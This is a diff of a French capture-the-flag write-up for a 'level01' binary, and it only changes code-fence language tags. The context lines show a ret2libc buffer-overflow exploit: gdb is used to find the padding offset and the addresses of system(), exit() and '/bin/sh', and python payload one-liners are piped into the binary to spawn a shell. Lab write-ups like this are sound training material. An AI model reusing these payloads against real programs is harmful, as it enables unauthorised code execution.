@@ -1,6 +1,6 @@
 Je commence par analyser mon environnement :
 
-```
+```bash
 $ id && pwd && ls -la
 uid=1001(level01) gid=1001(level01) groups=1001(level01),100(users)
 /home/users/level01
@@ -17,7 +17,7 @@ lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
 
 Je trouve un binaire `level01`, que je tente d'éxecuter :
 
-```
+```bash
 $ ./level01
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: pomme
@@ -74,7 +74,7 @@ En me basant sur la décompilation des deux fonctions `verify_user_name()` et `v
 
 Naturellement, j'essaye :
 
-```
+```bash
 $ ./level01
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: dat_wil
@@ -107,7 +107,7 @@ Pour utiliser cet exploit, je dois commencer par trouver de combien de bytes le 
 
 Pour cela, j'utilise `gdb` :
 
-```
+```bash
 $ gdb ./level01 -q
 Reading symbols from /home/users/level01/level01...(no debugging symbols found)...done.
 
@@ -144,7 +144,7 @@ J'inclus l'adresse de `exit()` après celle de `system()` afin que le binaire s'
 
 Pour trouver l'adresse de `exit()`, `system()` et `/bin/sh`, j'utilise `gdb` :
 
-```
+```bash
 $ gdb ./level01 -q
 (gdb) b main
 Breakpoint 1 at 0x80484d5
@@ -208,7 +208,7 @@ J'inclus le bon username (`dat_wil`) afin de passer le premier if, ainsi que les
 
 J'essaye mon payload :
 
-```
+```bash
 $ (python -c 'print("dat_wil"); print("\x90"*76+"\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1])'; cat) | ./level01
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: verifying username....
@@ -220,7 +220,7 @@ nope, incorrect password...
 
 Sans succès, j'analyse à nouveau mon procédé et note ma remarque sur :
 
-```
+```bash
 0x080484d5 <+5>:     and    $0xfffffff0,%esp
 ```
 
@@ -228,7 +228,7 @@ Qui aligne la mémoire sur 16 bytes après le "prologue". Mon padding de 76 byte
 
 Je retente :
 
-```
+```bash
 $ (python -c 'print("dat_wil"); print("\x90"*80+"\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1])'; cat) | ./level01
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: verifying username....
